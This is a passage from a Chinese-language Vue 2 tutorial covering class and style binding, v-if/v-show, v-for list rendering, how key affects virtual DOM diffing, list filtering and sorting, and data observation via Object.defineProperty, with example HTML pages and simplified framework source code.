changeClassObj() {\n                    // 随机出现0, 1, 2中的一个\n                    const index = Math.floor(Math.random(0, 1) * 3);\n                    const className = classMsg[index];\n                    // 随意让其中一个改变值\n                    this.classObj[className] = !this.classObj[className];\n                }\n            },\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. class样式写法:class="xxx"，其中xxx可以是字符串、数组、对象。\n 2. 字符串的写法适用于：单个样式的动态修改。\n 3. 数组的写法适用于：数量可能非常多的样式，能简单的修改使用样式。\n 4. 对象的写法适用于：数量可能一般多的样式，能便捷、动态搭配使用样式。\n\n----------------------------------------\n\n\n# 5.2 绑定style样式\n\n内联style样式用的场景很少，一般使用class样式就够用了。但这里还是稍微介绍一下，style也同class一样使用v-bind绑定data相关数据，达到动态修改的目的。:style的值一般是对象（例如{fontSize: xxx}），极少的情况会是数组（每一项也是对象，例如{fontSize: xxx}），这种对象的属性名（样式名）要是首字母小写的驼峰命名。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n    <style>\n        .basic {\n            width: 200px;\n            height: 100px;\n            border: 1px red solid;\n        }\n    </style>\n</head>\n<body>\n    <div id="root">\n        \x3c!-- :style的值使用字符串形式，使用场景稍多一点点 --\x3e\n        <div class="basic" :style="styleObj" @click="changeStyleObj">点击我！:style是字符串形式</div><br><br>\n        \x3c!-- :style的值使用数组形式，使用场景很少 --\x3e\n        <div class="basic" :style="styleArr" @click="changeStyleArr">点击我！:style是数组形式</div><br><br>\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        // 样式对象，属性名（样式名）使用首字母小写的驼峰式\n        const addBg = { backgroundColor: \'royalblue\' }; // 在css中是 background-color: royalblue;\n        const addRadius = { borderRadius: \'20px\' };     // 在css中是 border-radius: 20px;\n        // 在css中是 background-image: linear-gradient(to right, red, yellow);\n        const addGrad = { backgroundImage: `linear-gradient(to right, red, yellow)` };\n        // 组成数组\n        const classMsg = [addBg, addRadius, addGrad];\n        const vm = new Vue({\n            el: \'#root\',\n            data: {\n                styleObj: {}, // 对象形式\n                styleArr: [], // 数组形式，其实就是用[]包裹styleObj这样的对象\n            },\n            methods: {\n                changeStyleObj() {\n                    // 随机出现0, 1, 2中的一个\n                    const index = Math.floor(Math.random(0, 1) * 3);\n                    this.styleObj = classMsg[index];\n                },\n                changeStyleArr() {\n                    // 随机出现0, 1, 2, 3, 4中的一个\n                    const index = Math.floor(Math.random(0, 1) * 4);\n                    // 截取[0, index)\n                    this.styleArr = classMsg.slice(0, index);\n                },\n            },\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. style样式的对象写法:style="{fontSize: xxx}"，xxx是动态值。\n 2. style样式的数组写法:style="[a, b]"，a和b其实是{fontSize: xxx}这样的对象。\n\n----------------------------------------\n\n\n# 六、条件渲染和列表渲染\n\n\n# 6.1 条件渲染\n\n经常有需求让页面的某个元素时而显示时而隐藏，在Vue中使用的是v-show和v-if指令。他们的值表面上是js表达式，最后都会自动转换成布尔值。这两个指令最明显的区别就是，v-show让元素隐藏但元素的DOM结构还在（使用了style="display: none;"），v-if是直接删除/增加了元素的DOM（包括事件监听器），那么在高频率操作“隐藏/显示”时使用v-show更好。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        \x3c!-- v-show v-if --\x3e\n        <h2 v-show="showStatus">你好</h2><br>\n        <button @click="showStatus = !showStatus">隐藏/显示</button>\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        const vm = new Vue({\n            el: \'#root\',\n            data: {\n                showStatus: true\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n在js中if经常联合使用if else和else，在Vue也可以v-if搭配v-if-else和v-else。联合使用v-if、v-if-else和v-else时，会比同时使用多个v-if要强。因为联合使用场景下只要达到其中一个条件的判断，其他分支就不会进行了；而同时使用多个v-if，每个v-if都会进行判断。然后需要注意联合使用的时候，v-if、v-if-else和v-else这三个元素所在之间不能被其他结构“打断”，否则只生效打断地点前面的v-if并且还会在控制台报错。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        <h1>a数值现在是：{{a}}</h1><br>\n        <button @click="a++">点击，a++</button><br>\n        <h2 v-if="a === 1">你好，a === 1</h2><br>\n        <h2 v-if="a === 2">你好，a === 2</h2><br>\n        <h2 v-if="a === 3">你好，a === 3</h2><br>\n        <h2 v-if="a === 4">你好，a === 4</h2><br>\n        <hr>\n        <h1>b数值现在是：{{b}}</h1><br>\n        <button @click="b++">点击，b++</button><br>\n        <h2 v-if="b === 1">你好，b === 1</h2>\x3c!-- 这里就不要加br了，否则只生效前面的 --\x3e\n        <h2 v-else-if="b === 2">你好，b === 2</h2>\x3c!-- 这里就不要加br了，否则只生效前面的 --\x3e\n        <h2 v-else-if="b === 3">你好，b === 3</h2>\x3c!-- 这里就不要加br了，否则只生效前面的 --\x3e\n        <h2 v-else="b === 4">你好，b === 4</h2>\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        const vm = new Vue({\n            el: \'#root\',\n            data: {\n                a: 0,\n                b: 0\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\n如果要让一块区域的元素集体隐藏or显示，虽然是可以使用容器包裹它们再使用v-show或v-if，但这样就额外引入了元素，如果没影响还好，有影响就麻烦了。Vue考虑到了这点，提供了<template>模板，这个<template>不影响结构不会引入额外的元素。值得注意的是<template>只能搭配v-if（还有v-if-else和v-else）使用。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        \x3c!-- template不会影响结构不会引入额外的元素 --\x3e\n        <template v-if="loginType === \'username\'">\n            <label>Username</label>\n            <input placeholder="Enter your username">\n        </template>\n        <template v-else>\n            <label>Email</label>\n            <input placeholder="Enter your email address">\n        </template>\n        <button @click="loginType = loginType === \'username\' ? \'email\' : \'username\'">点击切换模式</button>\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        const vm = new Vue({\n            el: \'#root\',\n            data: {\n                loginType: \'username\'\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. v-if：\n    1. 写法： 1) v-if="js表达式" 2) v-else-if="js表达式" 3) v-else="js表达式"。\n    2. 适用于：切换频率较低的场景。\n    3. 特点：不展示的DOM直接被删除。\n    4. 注意：v-if、v-else-if和v-else可以联合使用，但要求结构不能被“打断”。\n 2. v-show：\n    1. 写法： v-show="js表达式"。\n    2. 适用于：切换频率较高的场景。\n    3. 特点：不展示的DOM未被删除，仅仅使用样式隐藏掉。\n\n----------------------------------------\n\n\n# 6.2 列表渲染\n\n我们经常使用ul-li这样的列表结构来展示一个列表，Vue使用v-for指令将列表结构和列表数据组织起来。首先得注意的是v-for是写在item（例如<li>）的属性位置上的。\n\nv-for="xxx"的xxx通常是for-in的形式（for-of也可以），例如<li v-for="p in persons"></li>，这个persons是存储在data里的列表数据，而这个p是v-for语句里的形参（存储的是遍历出来的单项数据）。那么<li>标签体的内容就可以使用p这个单项数据了（用插值{{p.xxx}}的形式）。如果要使用索引index，那将p改为(p, index)，整体写下来就是v-for="(p, index) in persons"。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        <h2>人员信息列表（遍历数组）</h2>\n        <ul>\n            \x3c!-- v-for要写在单项也就是li上，其值是for-in的形式。li的标签体用p来填写（插值） --\x3e\n            <li v-for="p in persons" :key="p.id">{{p.id}}-{{p.name}}-{{p.age}}</li>\n        </ul>\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        const vm = new Vue({\n            el: \'#root\',\n            data: {\n                persons: [\n                    { id: \'001\', name: \'张三\', age: 18 },\n                    { id: \'002\', name: \'李四\', age: 19 },\n                    { id: \'003\', name: \'王五\', age: 20 }\n                ]\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\nv-for="xxx"的xxx除了是数组以外，还可以是对象，其实还能是字符串和数值（这两个用得少）。用在对象上就是遍历对象的属性，通常是<li v-for="(value, key) in obj">，value是属性值，key是属性名；用在字符串上就是遍历字符串的字符，通常是<li v-for="(value, index) in str">，value是字符，index是索引；用在数值上就是单纯遍历数值，数值从1开始的，但索引是从0开始的。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        \x3c!-- v-for用在对象上 --\x3e\n        <h2>汽车信息（遍历对象）</h2>\n        <ul>\n            <li v-for="(val, k) in car" :key="k">{{k}}-{{val}}</li>\n        </ul>\n        \x3c!-- v-for用在字符串上 --\x3e\n        <h2>遍历字符串hello</h2>\n        <ul>\n            <li v-for="(char, index) in str" :key="index">{{index}}-{{char}}</li>\n        </ul>\n        \x3c!-- v-for用在数值上 --\x3e\n        <h2>遍历数值5</h2>\n        <ul>\n            <li v-for="(num, index) in 5" :key="index">{{index}}-{{num}}</li>\n        </ul>\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        const vm = new Vue({\n            el: \'#root\',\n            data: {\n                car: { name: \'奥迪A8\', price: \'70万\', color: \'黑色\' },\n                str: \'hello\'\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. v-for指令用于展示列表数据。\n 2. 语法：v-for="(item, index) in xxx" :key="yyy"，item时单项数据，index是索引，xxx是列表数据，yyy是唯一标识。\n 3. v-for可遍历数组、对象、字符串、数值，后两个用得少。\n\n----------------------------------------\n\n\n# 6.3 key作用和简单diff分析\n\n前一小节例子里的:key="p.id"不要省略不写，这个key会被存放到虚拟DOM里作为唯一标识来使用的，但它并不存在于真实DOM里。如果给列表数据新增一条数据，重新渲染列表，Vue会将新虚拟DOM与旧虚拟DOM进行对比，按照key来选择谁与谁对比，内容不变的直接使用已存在的真实DOM来展示，内容变了的新建真实DOM来展示。\n\n整个虚拟DOM结构里可能就只有某局部一小块改变了，那就只更新那一小块（甚至只是文本的替换），这样重新渲染会很高效。看下面这个图，Vue认为整个虚拟DOM结构中只有key为004的需要新建真实DOM，其他虚拟DOM的内容没有变，那将对应的真实DOM照搬拿来使用即可。\n\n\n\nkey绑定id不会有什么问题，而key绑定index可能会出现问题。下面这个例子，如果将新<li>添加到列表开头，表面上看没什么问题，实际上多了许多没必要的真实DOM渲染；再进一步放大问题，如果<li>还包含了<input>，那输入框文本内容在重新渲染后会出现串行的问题。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        <h2>人员信息列表</h2>\n        <ul>\n            <button @click="add">新增一个老刘</button>\n            \x3c!-- 让key绑定index，看会出现什么问题 --\x3e\n            <li v-for="(p, index) in persons" :key="index">\n                {{p.name}}-{{p.age}} <input type="text">\n            </li>\n        </ul>\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        const vm = new Vue({\n            el: \'#root\',\n            data: {\n                persons: [\n                    { id: \'001\', name: \'张三\', age: 18 },\n                    { id: \'002\', name: \'李四\', age: 19 },\n                    { id: \'003\', name: \'王五\', age: 20 }\n                ]\n            },\n            methods: {\n                add() {\n                    // 添加新数据到列表 开头\n                    this.persons.unshift({ id: \'004\', name: \'老刘\', age: 30 });\n                }\n            },\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n\n\n\n\n上面的问题是主要因为index索引被重新分配了，导致key的“一一对应”已经达不到期望的那样，如下图。\n\n * “没必要的真实DOM渲染”的问题，是每次的比较Vue认为你每一项的text文本内容都变了（因为key对不上了，或者说对歪了），这就会让每项重新使用新虚拟DOM的text真实文本，例如key为0的新虚拟DOM的“老刘-30”会覆盖以前key为0的“张三-18”。\n * “输入框text会出现串行”的问题，是Vue认为新旧虚拟DOM的子元素input是相同的，然后拿以前input对应的真实DOM来渲染展示。例如key为0的<li>的子元素input会使用以前key为0的子元素input的真实input，那就会出行“老刘-30”文本后紧跟input的输入内容是“张三-18”。\n\n\n\n你可能会疑惑“子元素input是相同的”，不是输入内容不一样吗？其实Vue对input类的虚拟DOM的比较，没有涉及到输入组件的value。vm._vnode.children逐层可以找到input的虚拟DOM信息。可以从diff算法的源代码简单分析，没有对input类的新旧虚拟DOM的value进行比对。\n\n请看下面简化的源代码。上面例子的“text文本内容”，对应下面源代码的“如果两者的text不一样，让vnode的text直接给el的text”。而上面例子的“子元素input”，对应下面源代码的“如果两者都有子节点，则执行updateChildren比较子节点”。updateChildren在多个子节点情况下很复杂，但上面例子还好比较简单，只是一个子节点input。其实最终会让sameVnode去比较input的新旧虚拟DOM，但是sameVnode没有涉及到输入组件的value比较，会认为新旧input是相同的，所以最后会将旧虚拟DOM的真实input结构直接拿过来用，这就导致input的text显示串行。\n\n// 比较新旧虚拟DOM，来决定怎么更新对应的真实DOM。oldVnode是旧虚拟DOM，vnode是新虚拟DOM\nfunction patch(oldVnode, vnode) {\n    if (sameVnode(oldVnode, vnode)) { // 简单比较当前层次节点\n        patchVnode(oldVnode, vnode); // 复杂地比较子节点\n    } else { // 以下代码很多，就不贴过来了\n        // 根据新虚拟DOM来生成新真实DOM\n        // 有父节点，如果没有就作为根节点\n        // 1.添加 新虚拟DOM 对应的 真实DOM 到 父节点真实DOM 里\n        // 2.从 父节点真实DOM 里 移除 旧虚拟DOM 对应的 真实DOM\n    }\n}\n/**\n * 主要比较新旧虚拟DOM的text和children（其实text属于children这个数组里的）\n * 具体代码有些复杂，无关代码也混合其中，这里用注释书写了大概的逻辑\n*/\nfunction patchVnode(oldVnode, vnode) {\n    // 因为经过sameVnode的简单比较，那认为两者的当前层次的真实DOM（el）保持相同\n    // 如果两者指向同一个对象，就直接return\n    // 如果两者的text不一样，让vnode的text直接给el的text\n    // 如果oldVnode有子节点而Vnode没有，则删除el的子节点\n    // 如果oldVnode没有子节点而Vnode有，则将Vnode的子节点真实化之后添加到el\n    // 如果两者都有子节点，则执行updateChildren比较子节点，子节点很多的话就会很复杂\n}\n/**\n * 简单的比较，标签类型、data数据是否都存在、如果都是输入组件那组件类型是否相同等等\n * sameVnode和sameInputType都没有涉及到input的value比较\n*/\nfunction sameVnode(a, b) {\n    return (\n        a.key === b.key &&\n        a.asyncFactory === b.asyncFactory && (\n            (\n                a.tag === b.tag &&\n                a.isComment === b.isComment &&\n                isDef(a.data) === isDef(b.data) &&\n                sameInputType(a, b)\n            ) || (\n                isTrue(a.isAsyncPlaceholder) &&\n                isUndef(b.asyncFactory.error)\n            )\n        )\n    )\n}\nfunction sameInputType(a, b) {\n    if (a.tag !== \'input\') { return true }\n    var i;\n    var typeA = isDef(i = a.data) && isDef(i = i.attrs) && i.type;\n    var typeB = isDef(i = b.data) && isDef(i = i.attrs) && i.type;\n    return typeA === typeB || isTextInputType(typeA) && isTextInputType(typeB)\n}\nvar isTextInputType = makeMap(\'text,number,password,search,email,tel,url\');\nfunction isDef(v) { return v !== undefined && v !== null }\nfunction isTrue(v) { return v === true }\nfunction isUndef(v) { return v === undefined || v === null }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. key是虚拟DOM的唯一标识，当数据发生变化时，Vue根据新数据生成新的虚拟DOM，随后Vue进行新虚拟DOM与旧虚拟DOM的差异比较。\n 2. 比较的规则：\n    1. 先简单比较新旧虚拟DOM，如果直接就不相同了，就新建真实DOM并舔加到对应位置；\n    2. 简单比较相同后，新旧虚拟DOM共用当前层次的真实DOM（el），再去比较它们的children；\n       1. 如果新旧虚拟DOM的text不一样，那就让新虚拟DOM的text给el的text的使用；（特殊子节点text有这条特殊规则）\n       2. 如果旧虚拟DOM有子节点而新虚拟DOM没有，则删除el的子节点；\n       3. 如果旧虚拟DOM没有子节点而新虚拟DOM有，则将新虚拟DOM的子节点真实化之后添加到el；\n       4. 如果新旧虚拟DOM都有子节点，则执行updateChildren比较子节点，但最终会回归到简单比较。\n 3. 用index作为key可能会引发的问题：\n    1. 若对数据进行逆序添加、逆序删除等破坏顺序的操作，会产生没有必要的真实DOM更新（页面没问题，但效率低）；\n    2. 若结构中还包含输入类元素，会产生错误的DOM更新（页面有问题）。\n 4. 开发中如何选择key\n    1. 最好使用每条数据的唯一标识作为key，例如id、学号等；\n    2. 如果不存在对数据的逆序添加、逆序删除等破坏顺序的操作，仅用于渲染列表作为展示，使用index是没什么大问题的。\n\n----------------------------------------\n\n\n# 6.4 列表的过滤和排序\n\n列表的过滤还是比较简单的，使用计算属性配合filter，或者使用监视属性配合filter，代码如下\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        <input type="text" placeholder="请输入要搜索的关键字" v-model="keyWords">\n        <ul>\n            <li v-for="(p, index) in filPersons" :key="p.id">\n                {{p.name}}-{{p.sex}}\n            </li>\n        </ul>\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        const vm = new Vue({\n            el: \'#root\',\n            data: {\n                keyWords: \'\',\n                persons: [\n                    { id: \'001\', name: \'马冬梅\', sex: \'女\' },\n                    { id: \'002\', name: \'周冬雨\', sex: \'女\' },\n                    { id: \'003\', name: \'周杰伦\', sex: \'男\' },\n                    { id: \'004\', name: \'温兆伦\', sex: \'男\' },\n                ]\n            },\n            computed: {\n                filPersons() {\n                    return this.persons.filter((p) => {\n                        return p.name.indexOf(this.keyWords) !== -1;\n                    });\n                }\n            },\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        <input type="text" placeholder="请输入要搜索的关键字" v-model="keyWords">\n        <ul>\n            <li v-for="(p, index) in filPersons" :key="p.id">\n                {{p.name}}-{{p.sex}}\n            </li>\n        </ul>\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        const vm = new Vue({\n            el: \'#root\',\n            data: {\n                keyWords: \'\',\n                persons: [\n                    { id: \'001\', name: \'马冬梅\', sex: \'女\' },\n                    { id: \'002\', name: \'周冬雨\', sex: \'女\' },\n                    { id: \'003\', name: \'周杰伦\', sex: \'男\' },\n                    { id: \'004\', name: \'温兆伦\', sex: \'男\' },\n                ],\n                filPersons: []\n            },\n            watch: {\n                keyWords: {\n                    immediate: true,\n                    handler(val) {\n                        // return true是过滤出来\n                        this.filPersons = this.persons.filter((p) => {\n                            return p.name.indexOf(val) !== -1;\n                        });\n                    }\n                }\n            },\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n\n\n列表的排序也很简单，新增一个跟排序有关的属性sortType，为0原顺序、1升序、2降序，再在计算属性filPersons对数据列表使用sort()排序即可。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        <input type="text" placeholder="请输入要搜索的关键字" v-model="keyWords">\n        <button @click="sortType = 1">升序</button>\n        <button @click="sortType = 2">降序</button>\n        <button @click="sortType = 0">原顺序</button>\n        <ul>\n            <li v-for="(p, index) in filPersons" :key="p.id">\n                {{p.name}}-{{p.age}}\n            </li>\n        </ul>\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        const vm = new Vue({\n            el: \'#root\',\n            data: {\n                keyWords: \'\',\n                sortType: 0,\n                persons: [\n                    { id: \'001\', name: \'马冬梅\', age: 30 },\n                    { id: \'002\', name: \'周冬雨\', age: 25 },\n                    { id: \'003\', name: \'周杰伦\', age: 27 },\n                    { id: \'004\', name: \'温兆伦\', age: 21 },\n                ]\n            },\n            computed: {\n                filPersons() {\n                    const arr = this.persons.filter((p) => {\n                        return p.name.indexOf(this.keyWords) !== -1;\n                    });\n                    if (this.sortType) {\n                        // 升序a-b，降序b-a\n                        arr.sort((a, b) => {\n                            return this.sortType === 1 ? a.age - b.age : b.age - a.age\n                        });\n                    }\n                    return arr;\n                }\n            },\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n\n\n\n# 七、Vue的数据监视\n\n\n# 7.1 更新时的一个问题\n\n声明一点，这一章说的“监视”，与监视属性给开发人员提供的watch配置并不是同一个东西。\n\n在修改列表数据的某项时，如果修改的是某项的一些属性，那是可以被Vue监视到的，并会更新到页面；而如果直接将某项这样的对象直接替换掉（使用新对象），这样是不会被Vue监视到的，所以也不会更新到页面。代码如下，我们在控制台打印vm.persons[0]或vm._data.persons[0]，会发现这个对象确实被替换了，但页面没有更新。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        <button @click="updateMei">更新马冬梅这一行的信息</button>\n        <ul>\n            <li v-for="(p, index) in persons" :key="p.id">\n                {{p.name}}-{{p.age}}\n            </li>\n        </ul>\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        const vm = new Vue({\n            el: \'#root\',\n            data: {\n                persons: [\n                    { id: \'001\', name: \'马冬梅\', age: 30 },\n                    { id: \'002\', name: \'周冬雨\', age: 25 },\n                    { id: \'003\', name: \'周杰伦\', age: 27 },\n                    { id: \'004\', name: \'温兆伦\', age: 21 },\n                ]\n            },\n            methods: {\n                updateMei() {\n                    // 页面生效了\n                    /* this.persons[0].name = \'马老师\';\n                    this.persons[0].age = 50; */\n                    // 页面没生效，但vm.persons[0]是修改了的，只是没被Vue监视到\n                    this.persons[0] = { id: \'001\', name: \'马老师\', age: 50 };\n                }\n            },\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n\n\n\n# 7.2 监视的数据是对象\n\n我们想一下，怎么做到对数据属性进行监视呢？直接给属性使用Object.defineProperty()的set不就行了吗？确实是在属性的setter被触发时，可以去重新渲染页面，达到监视的目的。我们可以看以下代码会出现什么问题，如果在控制台里运行data.name = \'李四\'，就会出现Uncaught RangeError: Maximum call stack size exceeded这样的报错。这个报错的意思是“超出了调用栈大小”，这是因为你去改data.name会触发set，set内又改了data.name，这就陷入了一个死循环。\n\nlet data = { name: \'张三\', age: 18 };\nObject.defineProperty(data, \'name\', {\n    get() {\n        return data.name;\n    },\n    set(val) {\n        data.name = val;\n        // 对象的属性值改变，触发xxx动作，达到监视目的\n    }\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n想要优化上面的代码，非常的简单，只需要另外定义一个中间量，让getter/setter实际访问的是这个中间量即可。将以下代码复制到浏览器控制台然后回车执行，语句(2)的middle会保存语句(1)中data.name的值张三；继续在控制台里输入data.name再回车执行，会出现语句(3)的打印日志，然后就运行到语句(4)，就会读取middle的值也就是语句(2)这里存储的值张三；继续在控制台里输入data.name = \'李四\'再回车执行，会出现语句(5)的打印日志，然后就运行到语句(6)，就会修改middle的值也就是语句(2)这里存储的值变为李四。这样你不管是读取还是修改data.name，实际上都是访问的是middle，这个middle就充当了一个数据存储器。\n\nlet data = { name: \'张三\', age: 18 };                   // (1)\nlet middle = data.name;                                 // (2)\nObject.defineProperty(data, \'name\', {\n    get() {\n        console.log(\'读取name，实际上读取的是middle\');    // (3)\n        return middle;                                  // (4)\n    },\n    set(val) {\n        console.log(\'修改name，实际上修改的是middle\');    // (5)\n        middle = val;                                   // (6)\n        // 对象的属性值改变，触发xxx动作，达到监视目的\n    }\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n以上代码要完全模拟Vue中的数据监视，再加上Object.key()与遍历处理就可以了。我们直接看简化后的数据监视相关的源代码，你可以直接将下面的代码整体复制到浏览器控制台然后回车执行，再查看vm._data与前面章节里的vm._data是否差不多（暂时没有考虑多层级的对象，这会用到递归）。\n\n// 无关紧要的都删掉不看了\nfunction Vue(options) {\n    // vm会是以后的Vue实例，options就是配置对象\n    var vm = this;\n    // 暂时去掉Vue的处理，先直接赋给vm.$options\n    vm.$options = options;\n    // 数据处理相关\n    initState(vm);\n}\nfunction initState(vm) {\n    // 处理配置对象里的 “data”存储数据\n    initData(vm);\n}\nfunction initData(vm) {\n    var data = vm.$options.data;\n    // 暂不考虑data是function的情况\n    vm._data = data;\n    // 本章 七、Vue的数据监视 的重点 \n    observe(data, true /* asRootData */);\n}\n// 本章 七、Vue的数据监视 的重点 \nfunction observe(value, asRootData) {\n    var ob;\n    if (hasOwn(value, \'__ob__\') && value.__ob__ instanceof Observer) {\n        ob = value.__ob__;\n    } else {\n        ob = new Observer(value);\n    }\n    return ob;\n}\nfunction hasOwn(obj, key) {\n    return hasOwnProperty.call(obj, key)\n}\nvar Observer = function Observer(value) {\n    this.value = value;\n    // 属性是数组形式的\n    if (Array.isArray(value)) {\n        // 暂时省略，7.4 监视的数据是数组 里会说\n    } else {\n        // 属性是对象形式的\n        this.walk(value);\n    }\n};\n// 处理对象的所有属性\nObserver.prototype.walk = function walk(obj) {\n    var keys = Object.keys(obj);\n    for (var i = 0; i < keys.length; i++) {\n        defineReactive$$1(obj, keys[i]);\n    }\n};\n// 本章 七、Vue的数据监视 的核心，为属性做响应式处理。不过多层级的对象暂时没有考虑\nfunction defineReactive$$1(obj, key, val, customSetter, shallow) 